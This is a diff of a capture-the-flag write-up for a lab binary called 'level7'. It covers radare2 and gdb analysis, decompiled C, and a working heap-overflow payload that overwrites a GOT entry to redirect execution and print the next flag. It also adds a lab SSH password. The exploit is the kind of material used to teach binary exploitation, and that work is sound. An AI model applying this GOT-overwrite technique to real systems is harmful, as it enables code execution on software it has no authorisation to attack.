@@ -12,14 +12,14 @@ scp -r -P 4243 level7@localhost:/home/user/level7/level7 .
 
 I am running `r2` inside docker.
 ```bash
-docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "r2 /mnt/binary"
+docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "sudo /snap/radare2/current/bin/r2 /mnt/binary"
 ```
 
 ## Binary Analysis
 
 On the `r2` prompt we need to run a couple of commands to analyze the `main` function.
 ```bash
-[0x08048de8]> aaa # Automatically analyze the binary
+[0x08048de8]> aaa # Analyze the binary
 ...
 [0x08048ec0]> v # Enter visual mode
 ```
@@ -65,6 +65,29 @@ Non-debugging symbols:
 0x08048682  __i686.get_pc_thunk.bx
 0x08048690  __do_global_ctors_aux
 0x080486bc  _fini
+(gdb) info variables
+All defined variables:
+
+Non-debugging symbols:
+0x080486d8  _fp_hw
+0x080486dc  _IO_stdin_used
+0x08048824  __FRAME_END__
+0x08049828  __CTOR_LIST__
+0x08049828  __init_array_end
+0x08049828  __init_array_start
+0x0804982c  __CTOR_END__
+0x08049830  __DTOR_LIST__
+0x08049834  __DTOR_END__
+0x08049838  __JCR_END__
+0x08049838  __JCR_LIST__
+0x0804983c  _DYNAMIC
+0x08049908  _GLOBAL_OFFSET_TABLE_
+0x08049938  __data_start
+0x08049938  data_start
+0x0804993c  __dso_handle
+0x08049940  completed.6159
+0x08049944  dtor_idx.6161
+0x08049960  c
 (gdb) disassemble m
 Dump of assembler code for function m:
    0x080484f4 <+0>:	push   ebp
@@ -152,10 +175,7 @@ char *c = NULL;
 
 int m()
 {
-  int eax;
-
-  eax = time(0);
-  return printf("%s - %d\n", c, eax);
+  return printf("%s - %d\n", c, time(0));
 }
 
 int main(int argc, const char **argv, const char **envp)
@@ -251,13 +271,17 @@ And with the help of `gdb` we can see that the *destination* address of the seco
 
 ### Solution
 
+Connect with `ssh -p 4243 level7@localhost`
+Enter the password `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
 We can finally construct our payload like this:
 
-```bash
+```
 argv[1] = <padding 20> + 0x8049928 (= \x28\x99\x04\x08)
 argv[2] = 0x080484f4 (= \xf4\x84\x04\x08)
+```
 
-
+```bash
 ./level7 $(printf '%-20s\x28\x99\x04\x08' | tr ' ' '.') $(printf '\xf4\x84\x04\x08')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1708793862
